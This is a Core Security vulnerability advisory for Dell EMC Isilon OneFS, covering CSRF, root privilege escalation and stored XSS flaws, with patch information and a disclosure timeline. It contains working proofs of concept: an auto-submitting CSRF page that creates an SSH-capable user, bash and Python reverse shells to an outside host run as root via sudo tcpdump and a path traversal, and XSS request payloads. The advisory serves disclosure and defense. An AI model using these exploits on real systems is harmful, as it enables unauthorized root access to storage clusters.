@@ -1,0 +1,538 @@
+Core Security - Corelabs Advisory
+http://corelabs.coresecurity.com/
+Dell EMC Isilon OneFS Multiple Vulnerabilities
+
+1. **Advisory Information**
+
+Title: Dell EMC Isilon OneFS Multiple Vulnerabilities
+Advisory ID: CORE-2017-0009
+Advisory URL:
+http://www.coresecurity.com/advisories/dell-emc-isilon-onefs-multiple-vulnerabilities
+Date published: 2018-02-14
+Date of last update: 2018-02-14
+Vendors contacted: Dell EMC
+Release mode: Coordinated release
+
+2. **Vulnerability Information**
+
+Class: Cross-Site Request Forgery [CWE-352], Improper Privilege
+Management [CWE-269], Improper Privilege Management [CWE-269], Improper
+Neutralization of Input During Web Page Generation [CWE-79], Improper
+Neutralization of Input During Web Page Generation [CWE-79], Improper
+Neutralization of Input During Web Page Generation [CWE-79], Improper
+Neutralization of Input During Web Page Generation [CWE-79], Improper
+Neutralization of Input During Web Page Generation [CWE-79], Improper
+Neutralization of Input During Web Page Generation [CWE-79]
+Impact: Code execution
+Remotely Exploitable: Yes
+Locally Exploitable: Yes
+CVE Name: CVE-2018-1213, CVE-2018-1203, CVE-2018-1204, CVE-2018-1186,
+CVE-2018-1187, CVE-2018-1188, CVE-2018-1189, CVE-2018-1201,
+CVE-2018-1202
+
+3. **Vulnerability Description**
+
+Dell EMC's website states that:[1]
+
+The EMC Isilon scale-out NAS storage platform combines modular hardware
+with unified software to harness unstructured data. Powered by the OneFS
+operating system, an EMC Isilon cluster delivers a scalable pool of
+storage with a global namespace.
+
+The platform's unified software provides centralized Web-based and
+command-line administration to manage the following features:
+
+- A cluster that runs a distributed file system
+
+- Scale-out nodes that add capacity and performance
+
+- Storage options that manage files and tiering
+
+- Flexible data protection and high availability
+
+- Software modules that control costs and optimize resources
+
+Multiple vulnerabilities were found in the Isilon OneFS Web console that
+would allow a remote attacker to gain command execution as root.
+
+4. **Vulnerable Packages**
+
+. Dell EMC Isilon OneFS version 8.1.1.0 (CVE-2018-1203, CVE-2018-1204)
+. Dell EMC Isilon OneFS versions between 8.1.0.0 - 8.1.0.1 (all CVEs)
+. Dell EMC Isilon OneFS versions between 8.0.1.0 - 8.0.1.2 (all CVEs)
+. Dell EMC Isilon OneFS versions between 8.0.0.0 - 8.0.0.6 (all CVEs)
+. Dell EMC Isilon OneFS versions 7.2.1.x (CVE-2018-1186, CVE-2018-1188,
+  CVE-2018-1201, CVE-2018-1204, CVE-2018-1213)
+. Dell EMC Isilon OneFS version 7.1.1.11 (CVE-2018-1186, CVE-2018-1201,
+  CVE-2018-1202, CVE-2018-1204, CVE-2018-1213)
+
+Other products and versions might be affected, but they were not tested.
+
+5. **Vendor Information, Solutions and Workarounds**
+
+Dell EMC provided a link to the Download for Isilon OneFS page which
+contains the patches:
+
+. https://support.emc.com/downloads/15209_Isilon-OneFS
+
+6. **Credits**
+
+These vulnerabilities were discovered and researched by Ivan Huertas and
+Maximiliano Vidal from Core Security Consulting Services. The
+publication of this advisory was coordinated by Alberto Solino from Core
+Advisories Team.
+
+7. **Technical Description / Proof of Concept Code**
+
+The Web console contains several sensitive features that are vulnerable
+to cross-site request forgery. We describe this issue in section 7.1.
+
+Sections 7.2 and 7.3 show two vectors to escalate privileges to root.
+
+Various persistent cross-site scripting issues are presented in the
+remaining sections (7.4, 7.5, 7.6, 7.7, 7.8, 7.9).
+
+7.1. **Cross-site request forgery leading to command execution**
+
+[CVE-2018-1213]
+There are no anti-CSRF tokens in any forms on the Web interface.
+This would allow an attacker to submit authenticated requests when an
+authenticated user browses an attacker-controlled domain.
+
+The Web console contains a plethora of sensitive actions that can be
+abused, such as adding new users with SSH access or re-mapping existing
+storage directories to allow read-write-execute access to all users.
+
+All requests are JSON-encoded, which in some cases might hinder
+exploitation of CSRF vulnerabilities. However, the application does not
+verify the content-type set. This allows an attacker to exploit the CSRF
+vulnerabilities by setting a text/plain content-type and sending the
+request body as JSON_PAYLOAD=ignored.
+
+The following proof of concept creates a new user and assigns him a new
+role with enough privileges to log in via SSH, configure identifies,
+manage authentication providers, configure the cluster and run the
+remote support tools.
+
+/-----
+<html>
+  <body>
+    <form id="addUser" target="_blank"
+action="https://192.168.1.11:8080/platform/1/auth/users?query_member_of=true&resolve_names=true&start=0&zone=System&provider=lsa-local-provider%3ASystem"
+method="POST" enctype="text/plain">
+      <input type="hidden"
+name="{"name":"pepito","enabled":true,"shell":"/bin/zsh","password_expires":false,"password":"pepito"}"
+value="" />
+    </form>
+    <form id="addRole" target="_blank"
+action="https://192.168.1.11:8080/platform/1/auth/roles" method="POST"
+enctype="text/plain">
+      <input type="hidden"
+name="{"members":[{"name":"pepito","type":"user"}],"name":"pepito_role","privileges":[{"id":"ISI_PRIV_AUTH","name":"Auth","read_only":false},{"id":"ISI_PRIV_CLUSTER","name":"Cluster","read_only":false},{"id":"ISI_PRIV_REMOTE_SUPPORT","name":"Remote
+Support","read_only":false},{"id":"ISI_PRIV_LOGIN_SSH","name":"SSH","read_only":true}]}"
+value="" />
+    </form>
+    <script>
+      document.getElementById("addUser").submit();
+      window.setTimeout(function() {
+document.getElementById("addRole").submit() }, 1000);
+    </script>
+  </body>
+</html>
+-----/
+
+7.2. **Privilege escalation due to incorrect sudo permissions**
+
+[CVE-2018-1203]
+The compadmin user can run the tcpdump binary with root privileges via
+sudo. This allows for local privilege escalation, as tcpdump can be
+instructed to run shell commands when rotating capture files.
+
+/-----
+pepe-1$ id
+uid=11(compadmin) gid=0(wheel) groups=0(wheel),1(daemon)
+pepe-1$ cat /tmp/lala.sh
+#!/bin/bash
+
+bash -i >& /dev/tcp/192.168.1.66/8888 0>&1
+-----/
+
+Once the desired shell script is in place, the attacker can run tcpdump
+as follows to trigger the execution:
+
+/-----
+pepe-1$ sudo tcpdump -i em0 -G 1 -z /tmp/lala.sh -w dump
+tcpdump: WARNING: unable to contact casperd
+tcpdump: listening on em0, link-type EN10MB (Ethernet), capture size
+65535 bytes
+/tmp/lala.sh: connect: Connection refused
+/tmp/lala.sh: line 3: /dev/tcp/192.168.1.66/8888: Connection refused
+/tmp/lala.sh: connect: Connection refused
+/tmp/lala.sh: line 3: /dev/tcp/192.168.1.66/8888: Connection refused
+-----/
+
+As can be seen below, the script runs with root privileges:
+
+/-----
+$ nc -lvp 8888
+Listening on [0.0.0.0] (family 0, port 8888)
+Connection from [192.168.1.11] port 8888 [tcp/*] accepted (family 2,
+sport 57692)
+bash: no job control in this shell
+[root@pepe-1 /compadmin]# id
+uid=0(root) gid=0(wheel)
+groups=0(wheel),5(operator),10(admin),20(staff),70(ifs)
+-----/
+
+7.3. **Privilege escalation via remote support scripts**
+
+[CVE-2018-1204]
+From the documentation:
+
+"OneFS allows remote support through EMC Secure Remote Services (ESRS)
+which monitors your EMC Isilon cluster, and with your permission, allows
+remote access to Isilon Technical Support personnel to gather cluster
+data and troubleshoot issues."
+
+"After you enable remote support through ESRS, Isilon Technical Support
+personnel can request logs with scripts that gather EMC Isilon cluster
+data and then upload the data.
+The remote support scripts based on the Isilon isi_gather_info
+log-gathering tool are located in the /ifs/data/Isilon_Support/
+directory on each node."
+
+"Additionally, isi_phone_home, a tool that focuses on cluster- and
+node-specific data, is enabled once you enable ESRS. This tool is
+pre-set to send information about your cluster to Isilon Technical
+Support on a weekly basis. You can disable or enable isi_phone_home from
+ the OneFS command-line interface."
+
+As a cluster administrator or compadmin, it is possible to enable the
+remote support functionality, hence enabling the isi_phone_home tool via
+sudo. This tool is vulnerable to a path traversal when reading the
+script file to run, which would enable an attacker to execute arbitrary
+python code with root privileges.
+
+If remote support is not enabled, an attacker could perform the
+following operations in order to enable it:
+
+/-----
+pepe-1$ sudo isi network subnets create 1 ipv4 1
+pepe-1$ sudo isi network pools create 1.0
+pepe-1$ sudo isi remotesupport connectemc modify --enabled=yes
+--primary-esrs-gateway=10.10.10.10 --use-smtp-failover=no
+--gateway-access-pools=1.0
+-----/
+
+The isi_phone_home tool is supposed to run scripts located in the
+root-only writable directory /usr/local/isi_phone_home/script.
+However, the provided script name is used to construct the file path
+without sanitization, allowing an attacker to reference other locations.
+
+/-----
+def run_script(script_file_name):
+    script_path = CFG.get('SCRIPTDIR') + '/' + script_file_name
+    if os.path.isfile(script_path):
+        cmd = 'python ' + script_path  + ' 2>&1 '
+        command_thread = command.Command(cmd)
+        exit_code, output =
+command_thread.run(int(CFG.get("SCRIPT_TIEMOUT")))
+        if exit_code:
+            logging.error("Error: {0} running script: {1}
+".format(str(exit_code), output))
+    else:
+        logging.error("File: {0} list_file_name doesn't exist
+".format(script_path))
+-----/
+
+The final step would be to create a malicious python script on any
+writable location and call it via the isi_phone_tool using sudo.
+Keep in mind that the previous steps are not required if the system does
+already have remote support enabled.
+
+/-----
+pepe-1$ cat /tmp/lala.py
+#!/usr/bin/env python
+
+import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("192.168.1.66",8888))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+p=subprocess.call(["/bin/sh","-i"])
+
+pepe-1$ sudo /usr/bin/isi_phone_home --script-file
+../../../../../tmp/lala.py
+-----/
+
+/-----
+$ nc -lvp 8888
+Listening on [0.0.0.0] (family 0, port 8888)
+Connection from [192.168.1.11] port 8888 [tcp/*] accepted (family 2,
+sport 56807)
+pepe-1# id
+uid=0(root) gid=0(wheel)
+groups=0(wheel),5(operator),10(admin),20(staff),70(ifs)
+-----/
+
+7.4. *Persistent cross-site scripting in the cluster description*
+
+[CVE-2018-1186]
+The description parameter of the /cluster/identity endpoint is
+vulnerable to cross-site scripting.
+
+After the cluster's description is updated, the payload will be executed
+every time the user opens the Web console.
+
+/-----
+PUT /platform/3/cluster/identity HTTP/1.1
+Host: 192.168.1.11:8080
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:55.0)
+Gecko/20100101 Firefox/55.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/json
+X-Requested-With: XMLHttpRequest
+Content-Length: 61
+Cookie: isisessid=91835dd1-49de-4d40-9f09-94f6d029df24;
+Connection: close
+
+{"description":"my cluster<img src=x onerror=\"alert(1)\"/>"}
+-----/
+
+7.5. **Persistent cross-site scripting in the Network Configuration page**
+
+[CVE-2018-1187]
+The description parameter of the /network/groupnets endpoint is
+vulnerable to cross-site scripting.
+
+After the description is updated, the payload will be executed every
+time the user opens the network configuration page.
+
+/-----
+POST /platform/4/network/groupnets HTTP/1.1
+Host: 192.168.1.11:8080
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:55.0)
+Gecko/20100101 Firefox/55.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/json
+Content-Length: 186
+Cookie: isisessid=31f92221-15bb-421d-be00-d2bf42964c41;
+Connection: close
+
+{"description":"lala<script>alert(1)</script>","dns_cache_enabled":true,"dns_options":[],"dns_search":[],"dns_servers":[],"name":"pepito2","server_side_dns_search":false}
+-----/
+
+7.6. **Persistent cross-site scripting in the Authentication Providers
+page**
+
+[CVE-2018-1188]
+The realm parameter of the /auth/settings/krb5/realms endpoint is
+vulnerable to cross-site scripting.
+
+After the realm is updated, the payload will be executed every time the
+user opens the Kerberos tab of the Authentication Providers page.
+
+/-----
+POST /platform/1/auth/settings/krb5/realms HTTP/1.1
+Host: 192.168.1.11:8080
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:55.0)
+Gecko/20100101 Firefox/55.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/json
+Content-Length: 78
+Cookie: isisessid=31f92221-15bb-421d-be00-d2bf42964c41;
+Connection: close
+
+{"is_default_realm":true,"kdc":[],"realm":"ASDASD<img src=x
+onerror=alert(1)"}
+-----/
+
+7.7. **Persistent cross-site scripting in the Antivirus page**
+
+[CVE-2018-1189]
+The name parameter of the /antivirus/policies endpoint is vulnerable to
+cross-site scripting.
+
+After the name is updated, the payload will be executed every time the
+user opens the Antivirus page.
+
+/-----
+POST /platform/3/antivirus/policies HTTP/1.1
+Host: 192.168.1.11:8080
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:55.0)
+Gecko/20100101 Firefox/55.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/json
+Content-Length: 172
+Cookie: isisessid=c6903f55-43e7-42e2-b587-9f68142c3e06;
+Connection: close
+
+{"name":"pepe<img src=x
+onerror=\"alert(1)\"/>","description":"pepito","enabled":true,"force_run":false,"impact":null,"paths":["/ifs"],"recursion_depth":-1,"schedule":null}
+-----/
+
+7.8. **Persistent cross-site scripting in the Job Operations page**
+
+[CVE-2018-1201]
+The description parameter of the /job/policies endpoint is vulnerable to
+cross-site scripting.
+
+After the description is updated, the payload will be executed every
+time the user opens the Impact Policies section of the Job Operations
+page.
+
+/-----
+POST /platform/1/job/policies HTTP/1.1
+Host: 192.168.1.11:8080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101
+Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/json
+X-Requested-With: XMLHttpRequest
+Content-Length: 210
+Cookie: isisessid=8a5026c0-f045-4505-9d2b-ae83bc90f8ea;
+Connection: close
+
+{"name":"my policy","description":"<img src=x
+onerror=\"alert(1)\"/>","intervals":[{"begin":"Sunday
+00:00","end":"Sunday
+00:00","impact":"Low"},{"impact":"Low","begin":"Sunday
+01:03","end":"Monday 01:01"}]}
+-----/
+
+7.9. **Persistent cross-site scripting in the NDMP page**
+
+[CVE-2018-1202]
+The name parameter of the /protocols/ndmp/users endpoint is vulnerable
+to cross-site scripting.
+
+After the name is updated, the payload will be executed every time the
+user opens the NDMP Settings section of the NDMP page.
+
+/-----
+POST /platform/3/protocols/ndmp/users HTTP/1.1
+Host: 192.168.1.11:8080
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:55.0)
+Gecko/20100101 Firefox/55.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/json
+X-Requested-With: XMLHttpRequest
+Content-Length: 64
+Cookie: isisessid=91835dd1-49de-4d40-9f09-94f6d029df24;
+Connection: close
+
+{"name":"<img src=x onerror=\"alert(1)\"/>","password":"123123"}
+-----/
+
+8. **Report Timeline**
+
+2017-09-25: Core Security sent an initial notification to Dell EMC,
+including a draft advisory.
+2017-09-26: Dell EMC confirmed reception and informed an initial
+response would be ready by October 5th.
+2017-10-05: Dell EMC confirmed problem exists for all vulnerabilities
+reported except one, for which evaluation will be finalized soon. Dell
+EMC stated that, for the confirmed issues, a remediation plan will be
+provided by 10/16.
+2017-10-05: Core Security thanked the follow up email.
+2017-10-06: Dell EMC reported an update on one privilege escalation
+vulnerability reported, stating that 'ISI_PRIV_AUTH, and ISI_PRIV_ROLE
+both are equivalent to admin level access'. They said they will be
+updating the documentation to make it clearer.
+2017-10-11: Core Security thanked for the clarification and confirmed
+that section will be removed from the final advisory.
+2017-10-16: Dell EMC sent a schedule for fixing six of the reported
+vulnerabilities, with specific dates for every product's version.
+2017-10-16: Core Security thanked the information and said it will
+analyze the proposals sent once all the data is available.
+2017-10-19: Dell EMC sent a schedule for the remaining three reported
+vulnerabilities, with specific dates for every product's version.
+2017-10-31: Core Security on the schedule sent, stating that fixing the
+vulnerabilities by June 2018 is unacceptable given current industry
+standards. Requested a review of the timeline or a thorough explanation
+that justifies such delay.
+2017-11-01: Dell EMC answered back stating that after reviewing the
+original schedule, they said they believe they could have fixes ready
+for versions 8.0.x and 8.1.x by January 2018. Only caveat is the
+vulnerability 7.1 that might be pushed past January, although they said
+they think they could meet the January deadline.
+2017-11-13: Core Security thanked Dell's review of the release dates and
+agreed on the proposed schedule, stating Core Security would like to
+publish a single advisory for all the vulnerabilities reported.
+Also requested CVE IDs for
+each of the issues.
+2018-01-16: Core Security asked for a status update on the release date
+for the fixes since there was no update from Dell EMC.
+2018-01-17: Dell EMC answered back stating they are awaiting
+confirmation from the product team about the exact dates of release.
+They said they will get back to us by the end of this week. Dell EMC
+also asked our GPG public key again.
+2018-01-18: Core Security thanked for the update and sent the advisory's
+public GPG key.
+2018-01-19: Dell EMC stated they are currently working on drafting their
+advisory and will send it back to us (including CVEs) once they have the
+necessary approvals.
+2018-01-23: Dell EMC asked for our updated draft advisory.
+2018-01-23: Core Security sent the updated draft advisory to Dell EMC.
+2018-01-25: Dell EMC notified that the team are targeting to have the
+fix available by February 12th. Additionally, Dell will send its draft
+advisory by January 31th.
+2018-01-29: Core Security thanked for the update and proposed February
+14th as publication date.
+2018-01-31: Dell EMC informed Core Security that they agreed to release
+on February 14th. They also provided CVE IDs for each vulnerability
+reported.
+2018-02-01: Dell EMC sent its draft advisory.
+2018-02-14: Advisory CORE-2017-0009 published.
+
+9. **References**
+
+[1]
+https://www.dellemc.com/en-us/storage/isilon/onefs-operating-system.htm
+
+10. **About CoreLabs**
+
+CoreLabs, the research center of Core Security, is charged with
+anticipating the future needs and requirements for information security
+technologies.
+We conduct our research in several important areas of computer security
+including system vulnerabilities, cyber attack planning and simulation,
+source code auditing, and cryptography. Our results include problem
+formalization, identification of vulnerabilities, novel solutions and
+prototypes for new technologies. CoreLabs regularly publishes security
+advisories, technical papers, project information and shared software
+tools for public use at: http://corelabs.coresecurity.com.
+
+11. **About Core Security**
+
+Core Security provides companies with the security insight they need to
+know who, how, and what is vulnerable in their organization. The
+company's threat-aware, identity & access, network security, and
+vulnerability management solutions provide actionable insight and
+context needed to manage security risks across the enterprise. This
+shared insight gives customers a comprehensive view of their security
+posture to make better security remediation decisions. Better insight
+allows organizations to prioritize their efforts to protect critical
+assets, take action sooner to mitigate access risk, and react faster if
+a breach does occur.
+
+Core Security is headquartered in the USA with offices and operations in
+South America, Europe, Middle East and Asia. To learn more, contact Core
+Security at (678) 304-4500 or info@coresecurity.com
+
+
+12. **Disclaimer**
+
+The contents of this advisory are copyright (c) 2017 Core Security and
+(c) 2017 CoreLabs, and are licensed under a Creative Commons Attribution
+Non-Commercial Share-Alike 3.0 (United States) License:
+http://creativecommons.org/licenses/by-nc-sa/3.0/us/
